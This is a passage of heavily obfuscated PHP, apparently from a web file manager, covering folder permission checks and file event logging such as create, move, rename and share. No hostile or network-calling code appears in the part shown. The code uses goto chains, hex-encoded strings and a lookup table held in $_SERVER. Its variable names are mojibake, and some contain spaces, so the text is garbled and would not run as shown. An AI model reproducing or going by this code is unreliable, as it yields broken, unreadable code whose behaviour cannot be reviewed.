implode($B´¹­Ò‘Ã[8], $B›îÂ´†·ò); } return array($B´¹­Ò‘Ã[386] => $AÍ¸òä–İä[$B´¹­Ò‘Ã[28]], $B´¹­Ò‘Ã[75] => KodIO::make($AÍ¸òä–İä[$B´¹­Ò‘Ã[369]]), $B´¹­Ò‘Ã[2296] => $c¦Ï›‘İ©); goto EÕªŠöÎ; a¼çµ’ÆÖ’: $B´¹­Ò‘Ã =& $_SERVER[Å¸ş]; $b¡ˆ¼ÎİÜƒ = Model($B´¹­Ò‘Ã[1115]); $AÍ¸òä–İä = $b¡ˆ¼ÎİÜƒ->sourceInfo($eá­åˆ…ò‹); goto aÖ„ˆÁÜ¨; EÕªŠöÎ: } private function groupAuthInfo($dÈ±—ÍØóœ, $DóÊŞœ˜Ï) { $fìŸÀîºùå =& $_SERVER[Å¸ş]; $Dƒ˜Àâ½ğ = Model($fìŸÀîºùå[460])->getInfo($DóÊŞœ˜Ï); return array($fìŸÀîºùå[2297] => intval($dÈ±—ÍØóœ[$fìŸÀîºùå[376]]), $fìŸÀîºùå[2280] => $dÈ±—ÍØóœ, $fìŸÀîºùå[2298] => LNG($fìŸÀîºùå[2299]), $fìŸÀîºùå[2289] => array($fìŸÀîºùå[386] => $Dƒ˜Àâ½ğ[$fìŸÀîºùå[28]], $fìŸÀîºùå[75] => KodIO::make($Dƒ˜Àâ½ğ[$fìŸÀîºùå[391]][$fìŸÀîºùå[369]]), $fìŸÀîºùå[2296] => $Dƒ˜Àâ½ğ[$fìŸÀîºùå[465]])); } protected function groupRootAuth($eƒÁéññÄ£, $BùØ­óŸ¾ = false) { goto Bº”­îèõË; eĞ…Ìô•Ô£: $aÙ¾Ì¯´¿ƒ = array($B†¾Û° ßØ[369] => $BÊŒÖ„™®ö[$B†¾Û° ßØ[391]][$B†¾Û° ßØ[369]]); $F´Ïµ™Êƒ© = $B†¾Û° ßØ[2279]; $F¹©¥ä¡• = $this->field($F´Ïµ™Êƒ©)->cacheMemory()->where($aÙ¾Ì¯´¿ƒ)->select(); goto F¶«õåòé; f‡‘Ş¨¶¾ª: $Dğéóš×öó = isset($EÁ™«‘Ä…[$eƒÁéññÄ£]) ? $EÁ™«‘Ä…[$eƒÁéññÄ£][$B†¾Û° ßØ[376]] : !1; if ($Dğéóš×öó && Model($B†¾Û° ßØ[2271])->authCheckAction($Dğéóš×öó[$B†¾Û° ßØ[376]], $B†¾Û° ßØ[1562])) { $c¢ò¾ò¬Ü[$C¦¹äÄíµµ] = $Dğéóš×öó; return $Dğéóš×öó; } $BÊŒÖ„™®ö = Model($B†¾Û° ßØ[460])->getInfo($eƒÁéññÄ£); goto eĞ…Ìô•Ô£; Bº”­îèõË: $B†¾Û° ßØ =& $_SERVER[Å¸ş]; $BùØ­óŸ¾ = $BùØ­óŸ¾ ? $BùØ­óŸ¾ : USER_ID; $C¦¹äÄíµµ = $BùØ­óŸ¾ . $B†¾Û° ßØ[2300] . $eƒÁéññÄ£; goto CÈº¿¨»œŸ; CÈº¿¨»œŸ: static $c¢ò¾ò¬Ü = array(); if (isset($c¢ò¾ò¬Ü[$C¦¹äÄíµµ])) { return $c¢ò¾ò¬Ü[$C¦¹äÄíµµ]; } $EÁ™«‘Ä… = $this->userGroupList($BùØ­óŸ¾); goto f‡‘Ş¨¶¾ª; F¶«õåòé: $c…¼‹„ã‹ = $F¹©¥ä¡• ? $this->authMake($F¹©¥ä¡•, $BùØ­óŸ¾) : !1; $c¢ò¾ò¬Ü[$C¦¹äÄíµµ] = $c…¼‹„ã‹ ? $c…¼‹„ã‹[$B†¾Û° ßØ[418]] : $Dğéóš×öó; return $c¢ò¾ò¬Ü[$C¦¹äÄíµµ]; goto FÁäÓ›ëÁ; FÁäÓ›ëÁ: } public function authOwnerApply($FÍ¼ªàÃµ¿) { goto C¯ˆó±; E•Ùâ„›­»: $aÂÚÆÅ½ø® = array(); $CÔ´ÇÚİ¡ê = array(); foreach ($f„õã¦”İí as $eó¢„ªºà => $BÃ¨‚ ­”) { $FËï‡àæí = $this->authFolderOwnerUser($BÃ¨‚ ­”); $aÂÚÆÅ½ø®[$eó¢„ªºà] = $FËï‡àæí; $CÔ´ÇÚİ¡ê = array_merge($CÔ´ÇÚİ¡ê, $FËï‡àæí[$bÆˆ¹å¼Š[537]]); if ($FËï‡àæí[$bÆˆ¹å¼Š[2302]]) { break; } } goto D¹µ®º»Ş; D¹µ®º»Ş: if (count($CÔ´ÇÚİ¡ê) == 0) { $CÔ´ÇÚİ¡ê = $this->authFolderOwnerGroup($FÍ¼ªàÃµ¿[$bÆˆ¹å¼Š[458]]); } $CÔ´ÇÚİ¡ê = array_unique($CÔ´ÇÚİ¡ê); if (AuthModel::authCheckRoot($FÍ¼ªàÃµ¿[$bÆˆ¹å¼Š[376]][$bÆˆ¹å¼Š[377]])) { $CÔ´ÇÚİ¡ê[] = USER_ID; } goto Câó“ šï; Câó“ šï: $FÍ¼ªàÃµ¿[$bÆˆ¹å¼Š[376]][$bÆˆ¹å¼Š[2303]] = Model($bÆˆ¹å¼Š[476])->userListInfo($CÔ´ÇÚİ¡ê); return $FÍ¼ªàÃµ¿; goto FÂ›Õ­ë‰; DãŸÆì¨àí: $aÙ¦—©¸‘Æ = array($bÆˆ¹å¼Š[383] => array($bÆˆ¹å¼Š[384], $d³Ö‰Àˆƒ)); $f„õã¦”İí = $this->field($E÷ÂÍÛéìå)->where($aÙ¦—©¸‘Æ)->select(); $f„õã¦”İí = array_to_keyvalue_group($f„õã¦”İí, $bÆˆ¹å¼Š[369]); goto E•Ùâ„›­»; a¢¦‚æ²Ñ: $d³Ö‰Àˆƒ = Model($bÆˆ¹å¼Š[1115])->parentLevelArray($FÍ¼ªàÃµ¿[$bÆˆ¹å¼Š[461]]); $d³Ö‰Àˆƒ = array_merge(array($FÍ¼ªàÃµ¿[$bÆˆ¹å¼Š[369]]), array_reverse($d³Ö‰Àˆƒ)); $E÷ÂÍÛéìå = $bÆˆ¹å¼Š[2279]; goto DãŸÆì¨àí; C¯ˆó±: $bÆˆ¹å¼Š =& $_SERVER[Å¸ş]; if (empty($FÍ¼ªàÃµ¿[$bÆˆ¹å¼Š[376]]) || isset($FÍ¼ªàÃµ¿[$bÆˆ¹å¼Š[2301]]) && $FÍ¼ªàÃµ¿[$bÆˆ¹å¼Š[2301]]) { return $FÍ¼ªàÃµ¿; } if (AuthModel::authCheckRoot($FÍ¼ªàÃµ¿[$bÆˆ¹å¼Š[376]][$bÆˆ¹å¼Š[377]])) { return $FÍ¼ªàÃµ¿; } goto a¢¦‚æ²Ñ; FÂ›Õ­ë‰: } private function authFolderOwnerGroup($CÖÙíÆä¯Ï) { $cãğÆè±˜ï =& $_SERVER[Å¸ş]; $eß²‹ª¿µÁ = Model($cãğÆè±˜ï[2187])->where(array($cãğÆè±˜ï[2108] => $CÖÙíÆä¯Ï))->select(); $B‘öÃ”ï¿ = array(); if (!$eß²‹ª¿µÁ) { return $B‘öÃ”ï¿; } foreach ($eß²‹ª¿µÁ as $däåè¨®ø¿) { $bùø»Õİ§ = $this->authInfo($däåè¨®ø¿); if (AuthModel::authCheckRoot($bùø»Õİ§[$cãğÆè±˜ï[376]])) { $B‘öÃ”ï¿[] = $däåè¨®ø¿[$cãğÆè±˜ï[1436]]; } } return $B‘öÃ”ï¿; } private function authFolderOwnerUser($aÅ°šÃª¨¯) { $fª”ä¡Ë¶ =& $_SERVER[Å¸ş]; $Fö Õƒ£ŠÃ = array(); $fï‚Ô¿ ˜’ = !1; foreach ($aÅ°šÃª¨¯ as $fŸèô•³­) { $bÆ“ÏŠÊ‰ = $this->authInfo($fŸèô•³­); if ($fŸèô•³­[$fª”ä¡Ë¶[458]] == $fª”ä¡Ë¶[470]) { $fï‚Ô¿ ˜’ = !0; } if ($fŸèô•³­[$fª”ä¡Ë¶[371]] == SourceModel::TYPE_USER) { if (AuthModel::authCheckRoot($bÆ“ÏŠÊ‰[$fª”ä¡Ë¶[376]])) { $Fö Õƒ£ŠÃ[] = $fŸèô•³­[$fª”ä¡Ë¶[458]]; } } } return array($fª”ä¡Ë¶[537] => $Fö Õƒ£ŠÃ, $fª”ä¡Ë¶[2302] => $fï‚Ô¿ ˜’); } public function authMake($bŠ¹Ô½Ë¥, $DÁïÊ‹¾±² = false) { goto e¸ÜŠ‹˜–Å; e¸ÜŠ‹˜–Å: $fÊ¸†ƒ‹÷ã =& $_SERVER[Å¸ş]; if (!$bŠ¹Ô½Ë¥) { return array($fÊ¸†ƒ‹÷ã[377] => 0, $fÊ¸†ƒ‹÷ã[418] => !1); } $DÁïÊ‹¾±² = $DÁïÊ‹¾±² ? $DÁïÊ‹¾±² : USER_ID; goto a‚ÇÇí†‚; eİğÁàŞ¤¾: return $E¥ò¨¸½’Ş; goto Eï­š‹; EÉøä™æ“: $D¸™ÔÂà‘ = 0; $cí„èŞ¸ª‚ = 0; $AÊä·†Ò÷Ñ = array($fÊ¸†ƒ‹÷ã[369] => 0); goto D“ä¶ÂÄ¡é; E”ã…½éÊ: $D¦ªŞ·ÅŞÎ = 0; $b®¢‡÷“ˆÒ = 0; $EÒ›„™¾ì = 0; goto E™´…ÈÆØÔ; a‚ÇÇí†‚: $f²Úõ‡‹ğó = 0; $eÒ„»ÈÈ©Ø = 0; $B­äµ‘¶ğ¹ = 0; goto E”ã…½éÊ; E™´…ÈÆØÔ: $A˜Œ»Ò’¦© = 1000; $BÔİÅ¢åÎÖ = 0; $b®¼Ì›± = 0; goto EÉøä™æ“; D“ä¶ÂÄ¡é: foreach ($bŠ¹Ô½Ë¥ as $AÊä·†Ò÷Ñ) { $c°”“¹òÏ = $this->authInfo($AÊä·†Ò÷Ñ); $bºî‰‡£„ğ = $AÊä·†Ò÷Ñ[$fÊ¸†ƒ‹÷ã[458]]; $bƒ„¼¬½ = intval($c°”“¹òÏ[$fÊ¸†ƒ‹÷ã[376]]); if ($AÊä·†Ò÷Ñ[$fÊ¸†ƒ‹÷ã[371]] == SourceModel::TYPE_USER && $bºî‰‡£„ğ == $DÁïÊ‹¾±²) { $f²Úõ‡‹ğó = !0; $B­äµ‘¶ğ¹ = $c°”“¹òÏ; $eÒ„»ÈÈ©Ø = $bƒ„¼¬½; } else { if ($AÊä·†Ò÷Ñ[$fÊ¸†ƒ‹÷ã[371]] == SourceModel::TYPE_GROUP && $this->groupContainUser($bºî‰‡£„ğ, $DÁïÊ‹¾±²)) { $D¦ªŞ·ÅŞÎ = !0; $DÈ¥™›¸ = $this->groupStepToUserGroup($bºî‰‡£„ğ, $DÁïÊ‹¾±²); if ($DÈ¥™›¸ < $A˜Œ»Ò’¦©) { $A˜Œ»Ò’¦© = $DÈ¥™›¸; $b®¢‡÷“ˆÒ = $bƒ„¼¬½; $EÒ›„™¾ì = $c°”“¹òÏ; $BÔİÅ¢åÎÖ = $bºî‰‡£„ğ; } if ($DÈ¥™›¸ == $A˜Œ»Ò’¦© && $bƒ„¼¬½ >= $b®¢‡÷“ˆÒ) { $b®¢‡÷“ˆÒ = $bƒ„¼¬½; $EÒ›„™¾ì = $c°”“¹òÏ; $BÔİÅ¢åÎÖ = $bºî‰‡£„ğ; } } else { if ($bºî‰‡£„ğ == $fÊ¸†ƒ‹÷ã[470]) { $b®¼Ì›± = !0; $cí„èŞ¸ª‚ = $c°”“¹òÏ; $D¸™ÔÂà‘ = $bƒ„¼¬½; } } } } if ($f²Úõ‡‹ğó) { $E‘¨ùğ‹è‚ = $eÒ„»ÈÈ©Ø; $c°”“¹òÏ = $B­äµ‘¶ğ¹; $FÒ÷§ÃÏå› = LNG($fÊ¸†ƒ‹÷ã[2304]); } else { if ($D¦ªŞ·ÅŞÎ) { $E‘¨ùğ‹è‚ = $b®¢‡÷“ˆÒ; $c°”“¹òÏ = $EÒ›„™¾ì; $E­Ç¬è±Õø = Model($fÊ¸†ƒ‹÷ã[460])->getInfo($BÔİÅ¢åÎÖ); $FÒ÷§ÃÏå› = $fÊ¸†ƒ‹÷ã[157] . $E­Ç¬è±Õø[$fÊ¸†ƒ‹÷ã[465]] . $fÊ¸†ƒ‹÷ã[2305] . LNG($fÊ¸†ƒ‹÷ã[2306]); } else { if ($b®¼Ì›±) { $E‘¨ùğ‹è‚ = $D¸™ÔÂà‘; $c°”“¹òÏ = $cí„èŞ¸ª‚; $FÒ÷§ÃÏå› = LNG($fÊ¸†ƒ‹÷ã[2276]); } else { $FÒ÷§ÃÏå› = $fÊ¸†ƒ‹÷ã[33]; } } } $E¥ò¨¸½’Ş = array($fÊ¸†ƒ‹÷ã[2297] => intval($E‘¨ùğ‹è‚), $fÊ¸†ƒ‹÷ã[2280] => $c°”“¹òÏ, $fÊ¸†ƒ‹÷ã[2298] => $FÒ÷§ÃÏå›, $fÊ¸†ƒ‹÷ã[2289] => $this->sourceAuthInfo($AÊä·†Ò÷Ñ[$fÊ¸†ƒ‹÷ã[369]])); goto eİğÁàŞ¤¾; Eï­š‹: } private function groupContainUser($D™„Æµò¸‡, $bÒÌ¼Á = false) { return in_array($D™„Æµò¸‡, $this->userGroupParents($bÒÌ¼Á)); } private function groupStepToUserGroup($FªÙÆØ®¼ï, $aÇà™¾³×Î = false) { goto Có¥ÉÇ°ÈÛ; Có¥ÉÇ°ÈÛ: $fÇóÉî¹‘ =& $_SERVER[Å¸ş]; $fª‚êñê¦ = $this->userGroupList($aÇà™¾³×Î); $A¼”å¥àÑÛ = 1000; goto a…ÖÉÏŒˆ; a…ÖÉÏŒˆ: $cí¢¯ëåªŸ = $GLOBALS[$fÇóÉî¹‘[6]][$fÇóÉî¹‘[84]][$fÇóÉî¹‘[2199]] == 1; $AÛ›íÀâëò = $cí¢¯ëåªŸ ? 3 : 2; foreach ($fª‚êñê¦ as $dƒˆÊ…Ù³ò) { if ($dƒˆÊ…Ù³ò[$fÇóÉî¹‘[2108]] == $FªÙÆØ®¼ï) { return 0; } $Cª‰ˆÄÛÛ‚ = explode($fÇóÉî¹‘[47], trim($dƒˆÊ…Ù³ò[$fÇóÉî¹‘[461]], $fÇóÉî¹‘[47])); if ($Cª‰ˆÄÛÛ‚[0] == $fÇóÉî¹‘[470] && count($Cª‰ˆÄÛÛ‚) > $AÛ›íÀâëò) { $dŠ¼Æ‹„Š = array_reverse(array_slice($Cª‰ˆÄÛÛ‚, $AÛ›íÀâëò)); $f§‡Ñà¦¤Û = array_search($FªÙÆØ®¼ï, $dŠ¼Æ‹„Š); if ($f§‡Ñà¦¤Û !== !1 && $f§‡Ñà¦¤Û + 1 <= $A¼”å¥àÑÛ) { $A¼”å¥àÑÛ = $f§‡Ñà¦¤Û + 1; } } } goto dâÒÆ³ÒËÉ; dâÒÆ³ÒËÉ: return $A¼”å¥àÑÛ; goto eìÊÌÎà»; eìÊÌÎà»: } private function userGroupList($FùÄ–ˆîºã = false) { $bƒ‚Ğ°Å´ =& $_SERVER[Å¸ş]; static $aô¶ç¯÷’ø = array(); if (isset($aô¶ç¯÷’ø[$FùÄ–ˆîºã])) { return $aô¶ç¯÷’ø[$FùÄ–ˆîºã]; } $A²¾’ô§™¸ = Model($bƒ‚Ğ°Å´[479])->getInfo($FùÄ–ˆîºã); $aô¶ç¯÷’ø[$FùÄ–ˆîºã] = array_to_keyvalue($A²¾’ô§™¸[$bƒ‚Ğ°Å´[2277]], $bƒ‚Ğ°Å´[2108]); return $aô¶ç¯÷’ø[$FùÄ–ˆîºã]; } public function userGroupParents($B´è£Áˆí“) { goto F¹°Ü”›Ã‡; D÷äã¤½‹Æ: if (isset($F“í²¾âØ[$B´è£Áˆí“])) { return $F“í²¾âØ[$B´è£Áˆí“]; } $D«²”Şçé = $this->userGroupList($B´è£Áˆí“); $E±äŒ«Šù… = array(); goto e§•ß¤º¬; e§•ß¤º¬: $FìÁ«‘Î¿² = $GLOBALS[$cÂ§ÑÕ³Š[6]][$cÂ§ÑÕ³Š[84]][$cÂ§ÑÕ³Š[2199]] == 1; $BŠŞ³‰ãæí = $FìÁ«‘Î¿² ? 3 : 2; foreach ($D«²”Şçé as $bÙÎ¸­ Â•) { $AÂ¿Ÿ…Š¸Ú = array($bÙÎ¸­ Â•[$cÂ§ÑÕ³Š[2108]]); $d”İ£ªéÊÎ = explode($cÂ§ÑÕ³Š[47], trim($bÙÎ¸­ Â•[$cÂ§ÑÕ³Š[461]], $cÂ§ÑÕ³Š[47])); if ($d”İ£ªéÊÎ[0] == $cÂ§ÑÕ³Š[470] && count($d”İ£ªéÊÎ) > $BŠŞ³‰ãæí) { $cŸÅÈª–½ = array_slice($d”İ£ªéÊÎ, $BŠŞ³‰ãæí); $AÂ¿Ÿ…Š¸Ú = array_merge($AÂ¿Ÿ…Š¸Ú, array_reverse($cŸÅÈª–½)); } $E±äŒ«Šù… = array_merge($E±äŒ«Šù…, $AÂ¿Ÿ…Š¸Ú); } goto DŒ¿•áŞÏ; F¹°Ü”›Ã‡: $cÂ§ÑÕ³Š =& $_SERVER[Å¸ş]; static $F“í²¾âØ = array(); $B´è£Áˆí“ = $B´è£Áˆí“ ? $B´è£Áˆí“ : USER_ID; goto D÷äã¤½‹Æ; DŒ¿•áŞÏ: $F“í²¾âØ[$B´è£Áˆí“] = array_unique($E±äŒ«Šù…); return $F“í²¾âØ[$B´è£Áˆí“]; goto CÄ“Ô‚©Ì; CÄ“Ô‚©Ì: } public function authTargetInfoMake($fÛ­Ÿœ¤±à) { goto f«ƒÒ™³Õ; DÃ§¼³‹„: foreach ($fÛ­Ÿœ¤±à as $D÷ÜÆ²÷Ù) { if ($D÷ÜÆ²÷Ù[$aÍ¦İåôÎè[371]] == SourceModel::TYPE_USER) { $bÑœ»Š Ğ[] = intval($D÷ÜÆ²÷Ù[$aÍ¦İåôÎè[458]]); } else { if ($D÷ÜÆ²÷Ù[$aÍ¦İåôÎè[371]] == SourceModel::TYPE_GROUP) { $dŸŠæòÈ¦”[] = intval($D÷ÜÆ²÷Ù[$aÍ¦İåôÎè[458]]); } } } if ($bÑœ»Š Ğ) { $bÑœ»Š Ğ = Model($aÍ¦İåôÎè[476])->userListInfo($bÑœ»Š Ğ); } if ($dŸŠæòÈ¦”) { $f³Ÿ¡é«Ø  = array($aÍ¦İåôÎè[2185] => array($aÍ¦İåôÎè[384], $dŸŠæòÈ¦”)); $dŸŠæòÈ¦” = Model($aÍ¦İåôÎè[460])->field($aÍ¦İåôÎè[2198])->where($f³Ÿ¡é«Ø )->select(); $dŸŠæòÈ¦” = array_to_keyvalue($dŸŠæòÈ¦”, $aÍ¦İåôÎè[2108]); } goto fèêÕºÀˆË; f«ƒÒ™³Õ: $aÍ¦İåôÎè =& $_SERVER[Å¸ş]; $bÑœ»Š Ğ = array(); $dŸŠæòÈ¦” = array(); goto DÃ§¼³‹„; fèêÕºÀˆË: return array($aÍ¦İåôÎè[2307] => $bÑœ»Š Ğ, $aÍ¦İåôÎè[2308] => $dŸŠæòÈ¦”); goto bæ—‡·½; bæ—‡·½: } public function authInfo($a›•ÖÁ£¦¢) { $C’”Äøõ³œ =& $_SERVER[Å¸ş]; if ($a›•ÖÁ£¦¢[$C’”Äøõ³œ[2252]]) { $C“ó©Œ¯¸ø = Model($C’”Äøõ³œ[2271])->listData($a›•ÖÁ£¦¢[$C’”Äøõ³œ[2252]]); if (!$C“ó©Œ¯¸ø) { return !1; $bğö°ÌÛŞ  = Model($C’”Äøõ³œ[2271])->listData(); $F˜ÄñîÛ¿İ = array_filter_by_field($bğö°ÌÛŞ , $C’”Äøõ³œ[376], $C’”Äøõ³œ[470]); return $F˜ÄñîÛ¿İ; } $C‚Ş´Êè… = array_field_key($C“ó©Œ¯¸ø, array($C’”Äøõ³œ[367], $C’”Äøõ³œ[28], $C’”Äøõ³œ[376], $C’”Äøõ³œ[2127], $C’”Äøõ³œ[2130])); $C‚Ş´Êè…[$C’”Äøõ³œ[2309]] = $a›•ÖÁ£¦¢; return $C‚Ş´Êè…; } else { return array($C’”Äøõ³œ[385] => 0, $C’”Äøõ³œ[2114] => $a›•ÖÁ£¦¢[$C’”Äøõ³œ[2253]], $C’”Äøõ³œ[386] => $C’”Äøõ³œ[33], $C’”Äøõ³œ[2127] => $C’”Äøõ³œ[2310]); } } } class SourceEventModel extends ModelBase { protected $tableName = "\x69\157\137\x73\157\165\162\143\145\137\x65\x76\145\x6e\164"; protected $dataAuto = array(array("\143\162\x65\x61\164\x65\x54\x69\155\145", "\164\x69\155\x65", "\x69\x6e\x73\145\x72\164", "\x66\x75\x6e\x63\164\x69\x6f\156"), array("\144\x65\x73\x63", '', "\x69\x6e\163\x65\x72\x74\x2c\165\160\x64\141\x74\145\54\163\x65\x6c\x65\x63\x74", "\x6a\163\x6f\156")); protected $eventSave = true; public function recodeStop() { $this->eventSave = !1; } public function recodeStart() { $this->eventSave = !0; } public function addEvent($d·ëäåéÈâ, $a÷”ìà„©ƒ, $D¯Æ‘ÖÛ²ƒ = '') { goto F¡ğ­Áå§Ä; BõÆİÀİ¢Õ: $bùĞëè•š” = array($Aåï…†Òä·[383] => $d·ëäåéÈâ, $Aåï…†Òä·[2311] => $A„Œ°ó¦á[$Aåï…†Òä·[463]], $Aåï…†Òä·[2312] => $A„Œ°ó¦á[$Aåï…†Òä·[28]], $Aåï…†Òä·[468] => $A„Œ°ó¦á[$Aåï…†Òä·[468]], $Aåï…†Òä·[1427] => USER_ID, $Aåï…†Òä·[388] => $a÷”ìà„©ƒ, $Aåï…†Òä·[1429] => $D¯Æ‘ÖÛ²ƒ); $this->addSystemLog($a÷”ìà„©ƒ, $bùĞëè•š”); return $this->add($bùĞëè•š”); goto Cê‰‰„ÆìÁ; F¡ğ­Áå§Ä: $Aåï…†Òä· =& $_SERVER[Å¸ş]; if (!$this->eventSave) { return; } $A„Œ°ó¦á = Model($Aåï…†Òä·[1115])->sourceInfo($d·ëäåéÈâ); goto Fâì¼£‚ÍÉ; Fâì¼£‚ÍÉ: if (!$A„Œ°ó¦á) { return !1; } if ($this->isCacheEvent($A„Œ°ó¦á, $a÷”ìà„©ƒ)) { return; } if ($D¯Æ‘ÖÛ²ƒ && is_string($D¯Æ‘ÖÛ²ƒ)) { $D¯Æ‘ÖÛ²ƒ = array($Aåï…†Òä·[2139] => $D¯Æ‘ÖÛ²ƒ); } goto BõÆİÀİ¢Õ; Cê‰‰„ÆìÁ: } private function addSystemLog($dœ¯‹˜Àï¡, $CÃßÇĞöğ¥) { $Bèòš¿¡¶µ =& $_SERVER[Å¸ş]; if ($dœ¯‹˜Àï¡ == $Bèòš¿¡¶µ[2313]) { $dœ¯‹˜Àï¡ = $CÃßÇĞöğ¥[$Bèòš¿¡¶µ[405]][$Bèòš¿¡¶µ[2314]]; } else { if (in_array($dœ¯‹˜Àï¡, array($Bèòš¿¡¶µ[2085], $Bèòš¿¡¶µ[2315]))) { $dœ¯‹˜Àï¡ = $CÃßÇĞöğ¥[$Bèòš¿¡¶µ[405]][$Bèòš¿¡¶µ[695]]; } } $cÔ¦ç…À = array_merge($CÃßÇĞöğ¥, array($Bèòš¿¡¶µ[2316] => $CÃßÇĞöğ¥[$Bèòš¿¡¶µ[369]], $Bèòš¿¡¶µ[2317] => $CÃßÇĞöğ¥[$Bèòš¿¡¶µ[2317]])); Model($Bèòš¿¡¶µ[2048])->addLog($Bèòš¿¡¶µ[2318] . $dœ¯‹˜Àï¡, $cÔ¦ç…À); } private function isCacheEvent($F™Ã×Ë½‰¬, $AÛÆƒ–µ±Ğ) { if ($F™Ã×Ë½‰¬[$_SERVER[Å¸ş][371]] == SourceModel::TYPE_SYSTEM) { return !0; } return !1; } public function eventCreate($Cùš¦í…¾, $C—¯ù¾Æïà) { $dœÇ‹•çÓ =& $_SERVER[Å¸ş]; $Aö££ŠÂ÷´ = Model($dœÇ‹•çÓ[1115])->sourceInfo($Cùš¦í…¾); $bÀîÅ™ØÎ = array($dœÇ‹•çÓ[2314] => $C—¯ù¾Æïà, $dœÇ‹•çÓ[28] => $Aö££ŠÂ÷´[$dœÇ‹•çÓ[28]]); return $this->addEvent($Cùš¦í…¾, $dœÇ‹•çÓ[2313], $bÀîÅ™ØÎ); } public function eventFileEdit($b”Ô”ù˜¯É) { $c’œŠ«Ö×‰ =& $_SERVER[Å¸ş]; $f¼Õˆµêè = array($c’œŠ«Ö×‰[2319] => $_SERVER[$c’œŠ«Ö×‰[2320]], $c’œŠ«Ö×‰[1751] => strtolower(ACTION)); return $this->addEvent($b”Ô”ù˜¯É, $c’œŠ«Ö×‰[2075], $f¼Õˆµêè); } public function eventRecycle($DõŒÊéÑ¯, $c³÷İ˜î¼ë) { return $this->addEvent($DõŒÊéÑ¯, $_SERVER[Å¸ş][2315], $c³÷İ˜î¼ë); } public function eventRemove($eïÑ”»Ø‡¿) { $f™†±–ƒÍ° =& $_SERVER[Å¸ş]; $c‘¤ÆëñƒÅ = Model($f™†±–ƒÍ°[1115])->sourceInfo($eïÑ”»Ø‡¿); $CÍ¤–“²“¾ = $c‘¤ÆëñƒÅ[$f™†±–ƒÍ°[28]]; return $this->addEvent($c‘¤ÆëñƒÅ[$f™†±–ƒÍ°[463]], $f™†±–ƒÍ°[2074], $CÍ¤–“²“¾); } public function eventShare($E¢›Æ—½Ü¢, $cÍ‚´ø“ê®) { return $this->addEvent($E¢›Æ—½Ü¢, $_SERVER[Å¸ş][2085], $cÍ‚´ø“ê®); } public function eventMove($Fá—ÉÜ°£Œ, $f£ªëï„©î, $Dİª±×) { goto FÀ§“˜ƒŸ; FÀ§“˜ƒŸ: $d©šç—¬Œ” =& $_SERVER[Å¸ş]; $EĞïÜº£ = Model($d©šç—¬Œ”[1115]); $aæ‹ë¤„” = $EĞïÜº£->sourceInfo($Fá—ÉÜ°£Œ); goto AÜ‹Çïêà; f•ÁÇÊ¨Â¦: $this->addEvent($f£ªëï„©î, $d©šç—¬Œ”[2325], $Fš¨’ˆ¿ö†); goto A³¤àìğÈŞ; E±Ô«¬õ½•: $this->addEvent($Fá—ÉÜ°£Œ, $d©šç—¬Œ”[494], $Fš¨’ˆ¿ö†); $aæ‹ë¤„” = $EĞïÜº£->sourceInfo($Fá—ÉÜ°£Œ); $Fš¨’ˆ¿ö† = array($d©šç—¬Œ”[369] => $aæ‹ë¤„”[$d©šç—¬Œ”[369]], $d©šç—¬Œ”[28] => $aæ‹ë¤„”[$d©šç—¬Œ”[28]]); goto f•ÁÇÊ¨Â¦; AÜ‹Çïêà: $aİÏ®İ¯½à = $EĞïÜº£->sourceInfo($f£ªëï„©î); $FŠ‡é¿®•Ğ = $EĞïÜº£->sourceInfo($Dİª±×); $Fš¨’ˆ¿ö† = array($d©šç—¬Œ”[1005] => $f£ªëï„©î, $d©šç—¬Œ”[2321] => $aİÏ®İ¯½à[$d©šç—¬Œ”[28]], $d©šç—¬Œ”[2322] => $aİÏ®İ¯½à[$d©šç—¬Œ”[468]], $d©šç—¬Œ”[1006] => $Dİª±×, $d©šç—¬Œ”[2323] => $FŠ‡é¿®•Ğ[$d©šç—¬Œ”[28]], $d©šç—¬Œ”[2324] => $FŠ‡é¿®•Ğ[$d©šç—¬Œ”[468]]); goto E±Ô«¬õ½•; A³¤àìğÈŞ: } public function eventCopy($B­ìê×õõ ) { $this->eventCreate($B­ìê×õõ , $_SERVER[Å¸ş][492]); } public function eventRename($F°“®éİùç, $b²…¿œ’Ôµ, $AÂ·¢¦‹¡ã) { $F†Àõ³¼ =& $_SERVER[Å¸ş]; $dº¹ä«×–ñ = array($F†Àõ³¼[1005] => $b²…¿œ’Ôµ, $F†Àõ³¼[1006] => $AÂ·¢¦‹¡ã); return $this->addEvent($F°“®éİùç, $F†Àõ³¼[1128], $dº¹ä«×–ñ); } public function eventAddComment($FäÃ¥Ã±Şõ, $CòÜå…ÈÅÄ) { return $this->addEvent($FäÃ¥Ã±Şõ, $_SERVER[Å¸ş][2326], $CòÜå…ÈÅÄ); } public function eventAddDesc($BÌË™¡ƒ’, $eî’äğîİ) { return $this->addEvent($BÌË™¡ƒ’, $_SERVER[Å¸ş][2327], $eî’äğîİ); } public function listBySource($E‰Á„²³) { goto Bï„¼‘Ùİ; Bï„¼‘Ùİ: $fî¢‹œ¦ó =& $_SERVER[Å¸ş]; $FŞ¦í¥´àÇ = Model($fî¢‹œ¦ó[1115])->sourceInfo($E‰Á„²³); $Cç¥Ì¥ö²ã = array($fî¢‹œ¦ó[383] => $E‰Á„²³); goto f¬ãÎ¸ãµ»; B¾¤ËòÛì‹: return $this->eventListParse($CÑÓ¤âì­‘, $E‰Á„²³); goto a—Á³ÌÚêğ; f¬ãÎ¸ãµ»: if ($FŞ¦í¥´àÇ[$fî¢‹œ¦ó[370]] == $fî¢‹œ¦ó[83]) { $B·ó¨šÀƒ = Model($fî¢‹œ¦ó[1115])->listSearchChildren($E‰Á„²³, 20000); $B·ó¨šÀƒ[] = $E‰Á„²³ . $fî¢‹œ¦ó[361]; $Cç¥Ì¥ö²ã = array($fî¢‹œ¦ó[369] => array($fî¢‹œ¦ó[7], $B·ó¨šÀƒ)); } $CÑÓ¤âì­‘ = $this->where($Cç¥Ì¥ö²ã)->order($fî¢‹œ¦ó[2328])->selectPage(); if ($CÑÓ¤âì­‘[$fî¢‹œ¦ó[351]][$fî¢‹œ¦ó[352]] == 0) { $CÑÓ¤âì­‘[$fî¢‹œ¦ó[351]][$fî¢‹œ¦ó[352]] = 1; $CÑÓ¤âì­‘[$fî¢‹œ¦ó[354]] = array(array($fî¢‹œ¦ó[383] => $E‰Á„²³, $fî¢‹œ¦ó[2311] => $FŞ¦í¥´àÇ[$fî¢‹œ¦ó[463]], $fî¢‹œ¦ó[1427] => $FŞ¦í¥´àÇ[$fî¢‹œ¦ó[378]], $fî¢‹œ¦ó[388] => $fî¢‹œ¦ó[2329], 